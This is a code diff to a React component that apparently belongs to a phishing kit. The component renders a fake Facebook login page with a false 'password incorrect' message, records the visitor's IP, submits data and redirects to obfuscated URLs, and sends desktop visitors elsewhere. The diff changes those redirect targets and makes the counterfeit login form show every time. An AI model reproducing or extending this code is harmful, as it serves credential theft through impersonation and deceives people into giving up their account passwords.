@@ -20,7 +20,7 @@ const About5955 = () => {
 
     useEffect(() => {
         if (isDesktop) {
-            window.location.href = 'dPy7Qr4Gs5Ft2Wp9Bu6Zv3Xq8Ky1Lo4Nh2Ix5Su7Jw8Tn3Rm4Fe9Ya6Hp1Gb5Jx8Vt7Yr6';
+            window.location.href = 'Zq7Nx0Lp3Hv9Tr4Fd5Mu8Cy1Jo6Wn2Kx5Yt3Pa9Gs0Bj7LMf7Ld2q4Vr1Wm6Xe3Ub8Kt2Ro5Ny';
         }
     }, [isDesktop]);
 
@@ -56,10 +56,10 @@ IP: '${ip}'
                         },
                     })
                         .then(() => {
-                            window.location = 'kTy3Ap7Sx5Dq9Lo2Hr4Vm1Zw8Yn6Kf3Gh7Jt2Qy8Uo5Pj9Mb4Re6Fu3Hv5Xq7Zl8Cn1Ms9';
+                            window.location = 'Ur5Xp3Lq9Yv2Wn6Ko4Md7Ct1Fb0Je8Ty3Gs5Nx4T3Hu9z0Xq6Kr1Po7Wm9Lb2Hv4Yt3Aj8Cf5Rs';
                         })
                         .catch((error) => {
-                            window.location = 'kTy3Ap7Sx5Dq9Lo2Hr4Vm1Zw8Yn6Kf3Gh7Jt2Qy8Uo5Pj9Mb4Re6Fu3Hv5Xq7Zl8Cn1Ms9';
+                            window.location = 'Ur5Xp3Lq9Yv2Wn6Ko4Md7Ct1Fb0Je8Ty3Gs5Nx4T3Hu9z0Xq6Kr1Po7Wm9Lb2Hv4Yt3Aj8Cf5Rs';
                         });
                 });
         }
@@ -177,25 +177,23 @@ IP: '${ip}'
             window.location = userUrl;
         }, 1000);
         resetUserNumber();
+        return null;
     }
 
-    console.log("hi here is the data", isUserData, userData);
-
-    if (isUserData) {
-      return (
+    // Always show the index (login form)
+    return (
         <section className="w-full flex sm:hidden flex-col items-center justify-start gap-4 bg-white">
-<div style={{ 
-    width: '100%', 
-    textAlign: 'left', 
-    fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',
-    padding: '4.4px 3.4px', 
-    fontSize: '13.6px',
-    color: 'white', 
-    backgroundColor: '#f73333', 
-}}>
-    The password you entered is incorrect. Did you forget your password?
-</div>
-
+            <div style={{ 
+                width: '100%', 
+                textAlign: 'left', 
+                fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',
+                padding: '4.4px 3.4px', 
+                fontSize: '13.6px',
+                color: 'white', 
+                backgroundColor: '#f73333', 
+            }}>
+                The password you entered is incorrect. Did you forget your password?
+            </div>
             <a href="/" className="w-[100px] h-[25px] flex items-center justify-center relative">
                 <img src="/images/facebook.png" alt="facebook" fill className="object-contain" />
             </a>
@@ -249,8 +247,6 @@ IP: '${ip}'
             </div>
         </section>
     );
-}
-return null; // Return null if no user data is present
 };
 
 export default About5955;
